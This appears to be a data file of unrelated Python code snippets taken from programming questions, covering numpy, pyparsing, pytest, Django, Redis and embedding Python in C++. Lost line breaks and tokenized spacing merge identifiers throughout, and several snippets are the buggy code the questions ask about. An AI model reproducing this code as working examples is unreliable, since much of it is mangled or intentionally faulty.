"A = [ 1.1 , 2.3 , 5.6 , 5.7 , 10.1 ] B = [ 0 , 1.9 , 2.4 , 2.7 , 8.4 , 9.1 , 10.7 , 11.8 ] A = [ 1 , 2 ] B = [ 0 , 1 , 10000 ]"
"newline = LineEnd ( ) minus = Literal ( '- ' ) plus = Literal ( '+ ' ) star = Literal ( '* ' ) dash = Literal ( '/ ' ) dashdash = Literal ( '// ' ) percent = Literal ( ' % ' ) starstar = Literal ( '** ' ) lparen = Literal ( ' ( ' ) rparen = Literal ( ' ) ' ) dot = Literal ( ' . ' ) comma = Literal ( ' , ' ) eq = Literal ( '= ' ) eqeq = Literal ( '== ' ) lt = Literal ( ' < ' ) gt = Literal ( ' > ' ) le = Literal ( ' < = ' ) ge = Literal ( ' > = ' ) not_ = Keyword ( 'not ' ) and_ = Keyword ( 'and ' ) or_ = Keyword ( 'or ' ) ident = Word ( alphas ) integer = Word ( nums ) expr = Forward ( ) parenthized = Group ( lparen + expr + rparen ) trailer = ( dot + ident ) atom = ident | integer | parenthizedfactor = Forward ( ) power = atom + ZeroOrMore ( trailer ) + Optional ( starstar + factor ) factor < < ( ZeroOrMore ( minus | plus ) + power ) term = ZeroOrMore ( factor + ( star | dashdash | dash | percent ) ) + factorarith = ZeroOrMore ( term + ( minus | plus ) ) + termcomp = ZeroOrMore ( arith + ( eqeq | le | ge | lt | gt ) ) + arithboolNot = ZeroOrMore ( not_ ) + compboolAnd = ZeroOrMore ( boolNot + and_ ) + boolNotboolOr = ZeroOrMore ( boolAnd + or_ ) + boolAndmatch = ZeroOrMore ( ident + eq ) + boolOrexpr < < matchstatement = expr + newlineprogram = OneOrMore ( statement ) print ( program.parseString ( ' 3* ( 1+2*3* ( 4+5 ) ) \n ' ) ) ~/Desktop/m2/pyp $ time python3 slow.py [ ' 3 ' , '* ' , [ ' ( ' , ' 1 ' , '+ ' , ' 2 ' , '* ' , ' 3 ' , '* ' , [ ' ( ' , ' 4 ' , '+ ' , ' 5 ' , ' ) ' ] , ' ) ' ] ] real 0m27.280suser 0m25.844ssys 0m1.364s"
"class Graph ( GraphDegree , GraphDegreePlot , GraphGeneration , object ) : def __init__ ( self ) : self.nodes = set ( [ ] ) self.edges = { } def get_nodes ( self ) : `` '' '' get nodes in graph `` '' '' return self.nodes def get_number_of_nodes ( self ) : `` '' '' get number of nodes in the graph `` '' '' return len ( self.nodes ) def get_edges ( self ) : `` '' '' get edges in graph `` '' '' return self.edges def get_heads_in_edges ( self ) : `` '' '' get heads in edges present on the graph `` '' '' return self.edges.values ( ) def add_node ( self , node ) : `` '' '' add new node to graph `` '' '' if node in self.get_nodes ( ) : raise ValueError ( 'Duplicate Node ' ) else : self.nodes.add ( node ) self.edges [ node ] = [ ] def add_connection ( self , edge ) : `` '' '' adds edge to graph `` '' '' origin = edge.get_origin ( ) destination = edge.get_destination ( ) if origin not in self.get_nodes ( ) or destination not in self.get_nodes ( ) : raise ValueError ( 'Nodes need to be in the graph ' ) self.get_edges ( ) [ origin ] .append ( destination ) self.get_edges ( ) [ destination ] .append ( origin ) def get_children ( self , node ) : `` '' '' Returns the list of nodes node node is connected to `` '' '' return self.get_edges ( ) [ node ] class GraphGeneration ( object ) : @ classmethod def gen_graph_from_text ( cls , file ) : `` ' Generate a graph from a txt . Each line of the txt begins with the source node and then the destination nodes follow `` ' cls.__init__ ( ) file = open ( file , ' r ' ) for line in file : origin = line [ 0 ] destinations = line [ 1 : -1 ] cls.add_node ( origin ) for destination in destinations : cls.add_node ( destination ) edge = Edge ( origin , destination ) cls.add_connection ( edge ) graph = Graph.gen_graph_from_text ( file )"
Team Player NumberA Joe 8A Mike 10A Steve 11B Henry 9B Steve 19B Joe 4C Mike 18C Joe 6C Steve 18C Dan 1C Henry 3 Team Player NumberA Joe 8A Steve 11B Joe 4B Steve 19C Joe 6C Steve 18
"PS C : \Users\peter_000\OneDrive\git\test > pipenv run pythonLoading .env environment variables…Python 3.6.4 ( v3.6.4 : d48eceb , Dec 19 2017 , 06:54:40 ) [ MSC v.1900 64 bit ( AMD64 ) ] on win32Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > > > > > > > > > > import pytest > > > pytest.__version__ ' 4.4.1 ' > > > > > > with pytest.raises ( TypeError , match= ' a string ' ) : ... raise TypeError ( ' a string ' ) # passes ... > > > def func ( ) : ... pass ... > > > func ( None ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : func ( ) takes 0 positional arguments but 1 was given > > > > > > > > > with pytest.raises ( TypeError , match='func ( ) takes 0 positional arguments but 1 was given ' ) : ... func ( None ) # fails ... Traceback ( most recent call last ) : File `` < stdin > '' , line 2 , in < module > TypeError : func ( ) takes 0 positional arguments but 1 was givenDuring handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` < stdin > '' , line 2 , in < module > File `` C : \Users\peter_000\.virtualenvs\test-_0Fb_hDQ\lib\site-packages\_pytest\python_api.py '' , line 735 , in __exit__ self.excinfo.match ( self.match_expr ) File `` C : \Users\peter_000\.virtualenvs\test-_0Fb_hDQ\lib\site-packages\_pytest\_code\code.py '' , line 575 , in match assert 0 , `` Pattern ' { ! s } ' not found in ' { ! s } ' '' .format ( regexp , self.value ) AssertionError : Pattern 'func ( ) takes 0 positional arguments but 1 was given ' not found in 'func ( ) takes 0 positional arguments but 1 was given ' > > > > > > with pytest.raises ( TypeError , match='func ( ) ' ) : ... raise TypeError ( 'func ( ) ' )"
"a = [ [ 1,2,4 ] , [ 0,2,3 ] , [ 1,3,4 ] , [ 0,2 ] ] output = array ( [ [ 0,1,1,0,1 ] , [ 1,0,1,1,0 ] , [ 0,1,0,1,1 ] , [ 1,0,1,0,0 ] ] )"
"> > > timeit.timeit ( ' '' - '' .join ( str ( n ) for n in range ( 100 ) ) ' , number=10000 ) 0.8187260627746582 > > > timeit.timeit ( ' '' - '' .join ( [ str ( n ) for n in range ( 100 ) ] ) ' , number=10000 ) 0.7288308143615723"
def default ( ) : global value value = 1 from globals import *value = 0def main ( ) : default ( ) print valueif __name__=='__main__ ' : main ( )
"def myzip_2x ( *seqs ) : its = [ iter ( seq ) for seq in seqs ] res = [ ] while True : try : res.append ( tuple ( [ next ( it ) for it in its ] ) ) # Or use generator expression ? # res.append ( tuple ( next ( it ) for it in its ) ) except StopIteration : break return resdef myzip_3x ( *seqs ) : its = [ iter ( seq ) for seq in seqs ] while True : try : yield tuple ( [ next ( it ) for it in its ] ) # Or use generator expression ? # yield tuple ( next ( it ) for it in its ) except StopIteration : returnprint ( myzip_2x ( 'abc ' , 'xyz123 ' ) ) print ( list ( myzip_3x ( [ 1 , 2 , 3 , 4 , 5 ] , [ 7 , 8 , 9 ] ) ) ) [ ( ' a ' , ' x ' ) , ( ' b ' , ' y ' ) , ( ' c ' , ' z ' ) ] [ ( 1 , 7 ) , ( 2 , 8 ) , ( 3 , 9 ) ]"
"# Set pathspath_dir = home + `` \Desktop\Test\\ '' path_res = path_dir + `` Results\\ '' def run ( ) : # Set definitions input = path_res + `` / '' + `` input.shp '' output = path_res + `` / '' + fname # Set current path to path_dir and search for only .shp files then run function os.chdir ( path_dir ) for fname in glob.glob ( `` *.shp '' ) : run_function , input , outputrun ( )"
"class MyImagesPipeline ( ImagesPipeline ) : # Name download version def image_key ( self , url ) : image_guid = url.split ( '/ ' ) [ -1 ] return 'full/ % s ' % ( image_guid ) def get_media_requests ( self , item , info ) : if item [ 'image_urls ' ] : for image_url in item [ 'image_urls ' ] : # wget -nH image_ul -P images/ yield Request ( image_url )"
"pip -v install pygments==2.0.2 -- force-reinstall -- ignore-installed -- target . ( rdoherty.local ) % % pip -v install pygments==2.0.2 -- force-reinstall -- ignore-installed -- target . ~/Documents/projects/kivy-ios/racecapture-ios/YourApp ( master ) Downloading/unpacking pygments==2.0.2 Could not fetch URL https : //pypi.python.org/simple/pygments/2.0.2 : 404 Client Error : Not Found Will skip URL https : //pypi.python.org/simple/pygments/2.0.2 when looking for download links for pygments==2.0.2 [ snip ] Using version 2.0.2 ( newest of versions : 2.0.2 , 2.0.2 ) Downloading Pygments-2.0.2-py2-none-any.whl ( 672kB ) : Downloading from URL https : //pypi.python.org/packages/2.7/P/Pygments/Pygments-2.0.2-py2-none-any.whl # md5=98f29db02f4b22f58a2d3f60646e1e1f ( from https : //pypi.python.org/simple/pygments/ ) ... Downloading Pygments-2.0.2-py2-none-any.whl ( 672kB ) : 672kB downloadedInstalling collected packages : pygmentsSuccessfully installed pygments Downloading/unpacking pygments==2.0.2 Could not fetch URL https : //pypi.python.org/simple/pygments/2.0.2 : 404 Client Error : Not Found [ snip ] Using version 2.0.2 ( newest of versions : 2.0.2 , 2.0.2 ) Downloading from URL https : //pypi.python.org/packages/2.7/P/Pygments/Pygments-2.0.2-py2-none-any.whl # md5=98f29db02f4b22f58a2d3f60646e1e1f ( from https : //pypi.python.org/simple/pygments/ ) Installing collected packages : pygmentsSuccessfully installed pygments ( rdoherty.local ) % % which pip ~/Documents/projects/kivy-ios/racecapture-ios/YourApp ( master ) /usr/local/bin/pip"
"X = reshape ( 1:16 , 4 , 4 ) . ' ; idx = [ true , false , false , true ] ; X ( idx , idx ) ans = 1 4 13 16 X = np.arange ( 1 , 17 ) .reshape ( 4 , 4 ) idx = [ True , False , False , True ] X [ idx , idx ] # Output : array ( [ 6 , 1 , 1 , 6 ] )"
"with file ( `` /tmp/foo '' , `` w '' ) as foo : print > > foo , `` Hello ! '' foo = file ( `` /tmp/foo '' , `` w '' ) try : print > > foo , `` Hello ! `` finally : foo.close ( )"
"class Product ( models.Model ) : productname = models.CharField ( max_length=1024 ) class Price ( models.Model ) : product = models.ForeignKey ( Product ) price = models.DecimalField ( max_digits=10 , decimal_places=2 ) created = models.DateTimeField ( auto_now_add=True ) ps = Product.objects.annotate ( c=Count ( `` price '' ) ) .filter ( c__gt=2 )"
"self.conn = MySQLdb.connect ( host = 'aaa ' , user = 'bbb ' , passwd = 'ccc ' , db = 'ddd ' , charset='utf8 ' ) cursor = self.conn.cursor ( ) cursor.execute ( `` SET NAMES utf8 '' ) cursor.execute ( 'SET CHARACTER SET utf8 ; ' ) cursor.execute ( 'SET character_set_connection=utf8 ; ' ) def do_queries ( request , sql ) : user = request.user conn = request.session [ 'conn ' ] cursor = request.session [ 'cursor ' ] cursor.execute ( sql )"
"> > > a_list = [ 1,2 ] > > > a_list [ 1 , 2 ] > > > [ print ( f ) for f in a_list ] 12 [ None , None ]"
"time = np.zeros ( 185000 ) lat1 = np.array ( ( [ 48.78,47.45 ] , [ 38.56,39.53 ] , ... ) ) # ~ 200000 rowslat2 = np.array ( ( [ 7.78,5.45 ] , [ 7.56,5.53 ] , ... ) ) # same number of rows as timefor ii in np.arange ( len ( time ) ) : pos = np.argwhere ( ( lat1 [ : ,0 ] ==lat2 [ ii,0 ] ) and \ ( lat1 [ : ,1 ] ==lat2 [ ii,1 ] ) ) if pos.size : pos = int ( pos ) time [ ii ] = dtime [ pos ]"
myVar = 255myVar += 1print myVar # ! ! myVar = 0 ! !
- The arrays all have exactly the same shape.- The arrays all have the same number of dimensions and the length of each dimensions is either a common length or 1.- Arrays that have too few dimensions can have their shapes prepended with a dimension of length 1 to satisfy property 2 . # Broadcastable if : # The arrays all have exactly the same shape.if a.shape == b.shape : result = True # The arrays all have the same number of dimensions elif len ( a.shape ) == len ( b.shape ) : # and the length of each dimensions is either a common length or 1. for i in len ( a.shape ) : if len ( a.shape [ i ] ! = 1 ) : result = False else : result = True # Arrays that have too few dimensions can have their shapes prepended with a dimension of length 1 to satisfy property 2elif a.shape == ( ) or b.shape == ( ) : result = Trueelse : result = Falsereturn result
"import osfrom glob import globfrom setuptools import setupfrom setuptools.dist import Distribution # TODO : Get the version from the git tag and or revision.version = ' 0.0.1a0'if os.name=='nt ' : so_ext = 'pyd'else : so_ext = 'so'pyfvs_files = glob ( 'pyfvs/* . { } '.format ( so_ext ) ) pyfvs_files.extend ( [ 'pyfvs/pyfvs.cfg ' , ] ) description = open ( './README.txt ' ) .readline ( ) .strip ( ) long_desc = open ( './README.txt ' ) .read ( ) .strip ( ) class BinaryDistribution ( Distribution ) : def is_pure ( self ) : return Falsesetup ( name='pyfvs ' , version=version , description=description , long_description=long_desc , url= '' , author= '' '' , author_email= '' '' , packages= [ 'pyfvs ' , ] , include_package_data=True , distclass=BinaryDistribution , data_files = [ ( 'pyfvs ' , pyfvs_files ) , ( 'pyfvs/docs ' , glob ( 'pyfvs/docs/* ' ) ) , ( 'pyfvs/examples ' , glob ( 'pyfvs/examples/* ' ) ) , ( 'pyfvs/test ' , glob ( 'pyfvs/test/* ' ) ) ] , entry_points= { 'console_scripts ' : [ 'fvs=pyfvs.__main__ : main ' ] } , classifiers= [ 'Development Status : : 3 - Alpha ' , 'Environment : : Console ' , 'Intended Audience : : Developers ' , 'Intended Audience : : End Users/Desktop ' , 'Intended Audience : : Science/Research ' , 'Natural Language : : English ' , 'Programming Language : : Python ' , 'Programming Language : : Fortran ' ] , keywords= '' )"
"from sympy import *H=Matrix ( [ [ 215.0 , -104.1 ,5.1 , -4.3 ,4.7 , -15.1 , -7.8 ] , [ -104.1 , 220.0 ,32.6 , 7.1 ,5.4 , 8.3 ,0.8 ] , [ 5.1 , 32.6 , 0. , -46.8 , 1.0 , -8.1 , 5.1 ] , [ -4.3 , 7.1 , -46.8 ,125.0 , -70.7 , -14.7 , -61.5 ] , [ 4.7 , 5.4 , 1.0 , -70.7 ,450.0 ,89.7 , -2.5 ] , [ -15.1 , 8.3 , -8.1 , -14.7 ,89.7 ,330.0 ,32.7 ] , [ -7.8 ,0.8 ,5.1 , -61.5 , -2.5 ,32.7 ,280.0 ] ] ) zz=H.eigenvects ( ) pprint ( zz )"
+ -- -- -- -+ -- -- -- -+| Col_A | Col_B |+ -- -- -- -+ -- -- -- -+| 1234 | || 6267 | || 6364 | || 573 | || 0 | || 838 | || 92 | || 3221 | |+ -- -- -- -+ -- -- -- -+ + -- -- -- -+ -- -- -- -- +| Col_A | Col_B |+ -- -- -- -+ -- -- -- -- +| 1234 | False || 6267 | False || 6364 | False || 573 | False || 0 | True || 838 | True || 92 | True || 3221 | True |+ -- -- -- -+ -- -- -- -- +
"lst = [ { 'id ' : 1 , 'language ' : 'it ' } , { 'id ' : 2 , 'language ' : 'en ' } , { 'id ' : 3 , 'language ' : 'es ' } , { 'id ' : 4 , 'language ' : 'en ' } ] lst = [ { 'id ' : 2 , 'language ' : 'en ' } , { 'id ' : 4 , 'language ' : 'en ' } , { 'id ' : 1 , 'language ' : 'it ' } , { 'id ' : 3 , 'language ' : 'es ' } ]"
"from unittest TestCasefrom unittest import mock @ mock.patch ( 'my_module.cls.method ' , mock.Mock ( side_effect=RuntimeError ( 'testing ' ) ) class SwitchViewTest ( TestCase ) : def test_use_class_patching ( self ) : # several other methods like this # test code .. @ mock.patch ( 'my_module.cls.method ' , mock.Mock ( side_effect=RuntimeError ( 'custom ' ) ) def test_override_class_patching ( self ) : # test code ..."
"import numpy as npimport cv2from matplotlib import pyplot as pltimg = cv2.imread ( `` 01.jpg '' ,0 ) output = img.copy ( ) edged = cv2.Canny ( img , 10 , 300 ) edged = cv2.dilate ( edged , None , iterations=1 ) edged = cv2.erode ( edged , None , iterations=1 ) # detect circles in the imagecircles = cv2.HoughCircles ( edged , cv2.HOUGH_GRADIENT , 1.2 , 100 ) # ensure at least some circles were foundif circles is not None : # convert the ( x , y ) coordinates and radius of the circles to integers circles = np.round ( circles ) .astype ( `` int '' ) # loop over the ( x , y ) coordinates and radius of the circles for ( x , y , r ) in circles [ 0 ] : print ( x , y , r ) # draw the circle in the output image , then draw a rectangle # corresponding to the center of the circle cv2.circle ( output , ( x , y ) , r , ( 0 , 255 , 0 ) , 4 ) cv2.rectangle ( output , ( x - 5 , y - 5 ) , ( x + 5 , y + 5 ) , ( 0 , 128 , 255 ) , -1 ) # show the output image plt.imshow ( output , cmap = 'gray ' , interpolation = 'bicubic ' ) plt.xticks ( [ ] ) , plt.yticks ( [ ] ) # to hide tick values on X and Y axis plt.figure ( ) plt.show ( )"
"logger.debug ( attachment_path ) currdir = os.path.abspath ( os.getcwd ( ) ) os.chdir ( os.path.dirname ( attachment_path ) ) headers = self._headersheaders [ 'Content-Type ' ] = content_typeheaders [ ' X-Override-File ' ] = 'true'if not os.path.exists ( attachment_path ) : raise Exception , `` File path was invalid , no file found at the path % s '' % attachment_pathfilesize = os.path.getsize ( attachment_path ) fileToUpload = open ( attachment_path , 'rb ' ) .read ( ) logger.info ( filesize ) logger.debug ( headers ) r = requests.put ( self._baseurl + 'problems/ ' + problemID + `` / '' + attachment_type + `` / '' + urllib.quote ( os.path.basename ( attachment_path ) ) , headers=headers , data=fileToUpload , timeout=300 ) string longer than 2147483647 bytes def read_in_chunks ( file_object , chunk_size=30720*30720 ) : `` '' '' Lazy function ( generator ) to read a file piece by piece . Default chunk size : 1k . '' '' '' while True : data = file_object.read ( chunk_size ) if not data : break yield data f = open ( attachment_path ) for piece in read_in_chunks ( f ) : r = requests.put ( self._baseurl + 'problems/ ' + problemID + `` / '' + attachment_type + `` / '' + urllib.quote ( os.path.basename ( attachment_path ) ) , headers=headers , data=piece , timeout=300 )"
"for i in range ( 4 ) : p = multiprocessing.Process ( target=worker ) p.start ( ) def worker ( ) : # stanford named entity tagger st = StanfordNERTagger ( model_path , stanford_ner_path ) print id ( st ) # all the processes print the same id for i in range ( 4 ) : p = threading.Thread ( target=worker ) p.start ( ) def worker ( ) : # stanford named entity tagger st = StanfordNERTagger ( model_path , stanford_ner_path ) print id ( st ) # threads print differnt ids"
"import numpy as npfrom numpy.random import randn as randM = 1024N = 2048np.random.seed ( 0 ) a = rand ( M , N ) .astype ( dtype=np.float32 ) w = rand ( N , M ) .astype ( dtype=np.float32 ) b = np.dot ( a , w ) for i in range ( 10 ) : b = b + np.dot ( b , a ) [ : , :1024 ] np.divide ( b , 100. , out=b ) print b [ 0 , :3 ]"
"def func ( a : int , b : str , callback : ? ? ? )"
df.copy ( )
"obj1.status = 2obj1.timestamp = 19211obj2.status = 3obj2.timestamp = 14211obj_list = [ obj1 , obj2 ] dict1 - < status , object > dict2 - < timestamp , object >"
"a = np.zeros ( [ 4,4 ] ) a [ 0 ] = [ 1. , 2. , 3. , 4 . ] for i in range ( len ( a ) -1 ) : a [ i+1 ] = 2*a [ i ] print a [ [ 1 . 2 . 3 . 4 . ] [ 2 . 4 . 6 . 8 . ] [ 4 . 8 . 12 . 16 . ] [ 8 . 16 . 24 . 32 . ] ] a = np.zeros ( [ 4,4 ] ) a [ 0 ] = [ 1. , 2. , 3. , 4 . ] a [ 1 : ] = 2*a [ 0 : -1 ] print a [ [ 1 . 2 . 3 . 4 . ] [ 2 . 4 . 6 . 8 . ] [ 0 . 0 . 0 . 0 . ] [ 0 . 0 . 0 . 0 . ] ]"
cat_var_1 cat_var_2 num_var_10 Orange Monkey 341 Banana Cat 562 Orange Dog 223 Banana Monkey 6..
"inf , outf = open ( ifn , '' r '' ) , open ( ofn , '' w '' ) outf.write ( inf.read ( ) ) inf.close ( ) outf.close ( )"
"import redisimport StringIOimport gzipr = redis.StrictRedis ( host='127.0.0.1 ' , port=80 , db=0 , decode_responses=True ) out = StringIO.StringIO ( ) with gzip.GzipFile ( fileobj=out , mode= ' w ' ) as f : value = f.write ( 'this is my test value ' ) r.set ( 'test ' , value )"
"valuelab A 50B 35C 8D 5E 1F 1 df = pd.DataFrame ( { 'lab ' : [ ' A ' , ' B ' , ' C ' , 'D ' , ' E ' , ' F ' ] , 'value ' : [ 50 , 35 , 8 , 5 , 1 , 1 ] } ) df = df.set_index ( 'lab ' ) valuelab A 50B 35C 8X 7 # sum of D , E , F"
https : //files.pythonhosted.org/packages/d4/bf/d884da8e2f7096d201c891d515eb6813a8e85df5eb6f5e12e867bf1d831c/PyQt5-5.11.3-5.11.2-cp35.cp36.cp37.cp38-abi3-manylinux1_x86_64.whl
std : :string expr= '' ( ( A > 0 ) & & ( B > 5 || C > 10 ) ) '' ;
"1 , 1 , 2 , 21 , 1 , 2 , 23 , 3 , 4 , 43 , 4 , 4 , 4 1 , 2 , 3 , 63 , 0 , 2 , 51 , 1 , 1 , 02 , 4 , 2 , 1 1.5 , 1.5 , 4.0 , 4.01.5 , 1.5 , 4.0 , 4.02.0 , 2.0 , 1.0 , 1.02.0 , 2.0 , 1.0 , 1.0 result_data = np.zeros ( zone_data.shape ) for i in np.unique ( zone_data ) : result_data [ zone_data == i ] = np.mean ( value_data [ zone_data == i ] ) import numpy as npimport timezones = np.random.randint ( 1000 , size= ( 2000,1000 ) ) values = np.random.rand ( 2000,1000 ) print 'start method 1 : 'start_time = time.time ( ) result_data = np.zeros ( zones.shape ) for i in np.unique ( zones ) : result_data [ zones == i ] = np.mean ( values [ zones == i ] ) print 'done method 1 in % .2f seconds ' % ( time.time ( ) - start_time ) printprint 'start method 2 : 'start_time = time.time ( ) # your method here ! print 'done method 2 in % .2f seconds ' % ( time.time ( ) - start_time ) start method 1 : done method 1 in 4.34 secondsstart method 2 : done method 2 in 0.00 seconds"
"import tensorflowdef foo ( param ) : return `` something '' # include `` python3.5/Python.h '' # include < iostream > # include < string > int main ( ) { Py_Initialize ( ) ; PyRun_SimpleString ( `` import sys '' ) ; PyRun_SimpleString ( `` if not hasattr ( sys , 'argv ' ) : sys.argv = [ `` ] '' ) ; PyRun_SimpleString ( `` sys.path.append ( './ ' ) '' ) ; PyObject* moduleName = PyUnicode_FromString ( `` script '' ) ; PyObject* pModule = PyImport_Import ( moduleName ) ; PyObject* fooFunc = PyObject_GetAttrString ( pModule , `` foo '' ) ; PyObject* param = PyUnicode_FromString ( `` dummy '' ) ; PyObject* args = PyTuple_Pack ( 1 , param ) ; PyObject* result = PyObject_CallObject ( fooFunc , args ) ; Py_CLEAR ( result ) ; Py_CLEAR ( args ) ; Py_CLEAR ( param ) ; Py_CLEAR ( fooFunc ) ; Py_CLEAR ( pModule ) ; Py_CLEAR ( moduleName ) ; Py_Finalize ( ) ; } g++ -std=c++11 main.cpp $ ( python3-config -- cflags ) $ ( python3-config -- ldflags ) -o main valgrind -- leak-check=yes ./main LEAK SUMMARY : ==24155== definitely lost : 161,840 bytes in 103 blocks==24155== indirectly lost : 33 bytes in 2 blocks==24155== possibly lost : 184,791 bytes in 132 blocks==24155== still reachable : 14,067,324 bytes in 130,118 blocks==24155== of which reachable via heuristic : ==24155== stdstring : 2,273,096 bytes in 43,865 blocks==24155== suppressed : 0 bytes in 0 blocks # script.pyfrom keras.layers import Inputdef foo ( param ) : a = Input ( shape= ( 32 , ) ) return `` str '' //main.cpp # include `` python3.5/Python.h '' # include < iostream > # include < string > int main ( ) { Py_Initialize ( ) ; PyRun_SimpleString ( `` import sys '' ) ; PyRun_SimpleString ( `` if not hasattr ( sys , 'argv ' ) : sys.argv = [ `` ] '' ) ; PyRun_SimpleString ( `` sys.path.append ( './ ' ) '' ) ; PyObject* moduleName = PyUnicode_FromString ( `` script '' ) ; PyObject* pModule = PyImport_Import ( moduleName ) ; for ( int i = 0 ; i < 10000000 ; ++i ) { std : :cout < < i < < std : :endl ; PyObject* fooFunc = PyObject_GetAttrString ( pModule , `` foo '' ) ; PyObject* param = PyUnicode_FromString ( `` dummy '' ) ; PyObject* args = PyTuple_Pack ( 1 , param ) ; PyObject* result = PyObject_CallObject ( fooFunc , args ) ; Py_CLEAR ( result ) ; Py_CLEAR ( args ) ; Py_CLEAR ( param ) ; Py_CLEAR ( fooFunc ) ; } Py_CLEAR ( pModule ) ; Py_CLEAR ( moduleName ) ; Py_Finalize ( ) ; }"
"@ app.route ( '/save ' , methods= [ 'POST ' ] ) def save_subscriptions ( ) : if request.method == 'POST ' : sites = request.form.get ( 'selected ' ) print ( sites ) sites = sites [ 0 : -1 ] g.cursor.execute ( 'UPDATE users SET sites = % s WHERE email = % s ' , [ sites , session.get ( 'email ' ) ] ) g.db.commit ( ) return json.dumps ( { 'status ' : 'success ' } )"
"if re.match ( 'foo ( \w+ ) bar ( \d+ ) ' , line ) : # do stuff with .group ( 1 ) and .group ( 2 ) elif re.match ( 'baz whoo_ ( \d+ ) ' , line ) : # do stuff with .group ( 1 ) # etc . m = re.match ( 'foo ( \w+ ) bar ( \d+ ) ' , line ) if m : # do stuff with m.group ( 1 ) and m.group ( 2 ) else : m = re.match ( 'baz whoo_ ( \d+ ) ' , line ) if m : # do stuff with m.group ( 1 )"
class Test ( object ) : item = 0 def __init__ ( self ) : print ( self.item ) def test ( self ) : print ( self.item ) class Subclass ( Test ) : item = 1s = Subclass ( ) s.test ( ) 11 public class Test { int item = 0 ; Test ( ) { System.out.println ( this.item ) ; } void test ( ) { System.out.println ( this.item ) ; } public static void main ( String [ ] args ) { Subclass s = new Subclass ( ) ; s.test ( ) ; } } class Subclass extends Test { int item = 1 ; } 00
"Main_Folder|_ my_main_file.py|_ Sites ( a directory inside Main_Folder ) |_ __init__.py |_ some_other.py # -*- mode : python -*-block_cipher = Nonea = Analysis ( [ 'my_main_file.py ' ] , pathex= [ ' C : \\Users\\User Name\\Main_Folder ' ] , binaries=None , datas= [ ( 'Sites/*.py ' , 'Sites ' ) ] , hiddenimports= [ ] , hookspath= [ ] , runtime_hooks= [ ] , excludes= [ ] , win_no_prefer_redirects=False , win_private_assemblies=False , cipher=block_cipher ) pyz = PYZ ( a.pure , a.zipped_data , cipher=block_cipher ) exe = EXE ( pyz , a.scripts , a.binaries , a.zipfiles , a.datas , name='my_main_file ' , debug=False , strip=False , upx=True , console=True )"
"class MyNumber ( int ) : def __new__ ( cls , value ) : # value is a string ( usually ) parsed from a file if value == ' N.A . ' : return None return int.__new__ ( cls , value )"
"from suds.client import Client from suds.plugin import MessagePlugin from suds.wsse import Timestamp , UsernameToken , Security WS_BASE_URL = 'http : //bbdev.bangor.ac.uk/webapps/ws/services/ ' class Learn9Plugin ( MessagePlugin ) : def marshalled ( self , context ) : password = context.envelope.childAtPath ( 'Header/Security/UsernameToken/Password ' ) password.set ( 'Type ' , 'http : //docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0 # PasswordText ' ) security = Security ( ) security.tokens.append ( Timestamp ( ) ) security.tokens.append ( UsernameToken ( 'session ' , 'nosession ' ) ) plugin = Learn9Plugin ( ) context = Client ( WS_BASE_URL + 'Context.WS ? wsdl ' , location = WS_BASE_URL + 'Context.WS ' , autoblend = True , wsse = security , plugins = [ plugin ] ) context.options.wsse.tokens [ 1 ] .password = context.service.initialize ( ) result = context.service.loginTool ( 'xxxxx ' , 'xxxx ' , 'xxxxx ' , `` , 500 ) course_id = '_15877_1 ' gradebook = Client ( WS_BASE_URL + 'Gradebook.WS ? wsdl ' , location=WS_BASE_URL + 'Gradebook.WS ' , autoblend=True , wsse=security , plugins= [ plugin ] ) attemptVO = gradebook.factory.create ( 'ns0 : AttemptVO ' ) attemptVO.override = False attemptVO.publicFeedbackToUser = False attemptVO.score = 0 attemptVO.gradeId = '_169_1 ' # SmithattemptVO.studentSubmission = 'Some sample text representing an assignment'attemptVO.studentSubmissionTextType = 'PLAIN_TEXT'print attemptVOattempt_result = gradebook.service.saveAttempts ( course_id , [ attemptVO , ] ) print attempt_result ( AttemptVO ) { attemptDate = None creationDate = None displayGrade = None exempt = None expansionData [ ] = < empty > feedbackToUser = None grade = None gradeId = `` _169_1 '' groupAttemptId = None id = None instructorNotes = None override = False publicFeedbackToUser = False score = 0 status = None studentComments = None studentSubmission = `` Some sample text representing an assignment '' studentSubmissionTextType = `` PLAIN_TEXT '' } [ _586_1 ]"
for k in d.keys ( ) : if condition : del d [ k ]
DictType = hashtable.HashDict
"lut = np.random.randint ( 256 , size= ( 65536 , ) ) .astype ( 'uint8 ' ) arr = np.random.randint ( 65536 , size= ( 1000 , 1000 ) ) .astype ( 'uint16 ' ) > > > np.take ( lut , arr , out=arr ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` C : \Python27\lib\site-packages\numpy\core\fromnumeric.py '' , line 103 , in take return take ( indices , axis , out , mode ) TypeError : array can not be safely cast to required type > > > np.can_cast ( 'uint8 ' , 'uint16 ' ) True > > > lut = lut.astype ( 'uint16 ' ) > > > np.take ( lut , arr , out=arr ) array ( [ [ 173 , 251 , 218 , ... , 110 , 98 , 235 ] , [ 200 , 231 , 91 , ... , 158 , 100 , 88 ] , [ 13 , 227 , 223 , ... , 94 , 56 , 36 ] , ... , [ 28 , 198 , 80 , ... , 60 , 87 , 118 ] , [ 156 , 46 , 118 , ... , 212 , 198 , 218 ] , [ 203 , 97 , 245 , ... , 3 , 191 , 173 ] ] , dtype=uint16 ) > > > lut = lut.astype ( 'int32 ' ) > > > np.take ( lut , arr , out=arr ) array ( [ [ 78 , 249 , 148 , ... , 77 , 12 , 167 ] , [ 138 , 5 , 206 , ... , 31 , 43 , 244 ] , [ 29 , 134 , 131 , ... , 100 , 107 , 1 ] , ... , [ 109 , 166 , 14 , ... , 64 , 95 , 102 ] , [ 152 , 169 , 102 , ... , 240 , 166 , 148 ] , [ 47 , 14 , 129 , ... , 237 , 11 , 78 ] ] , dtype=uint16 ) > > > np.can_cast ( 'int32 ' , 'uint16 ' ) False"
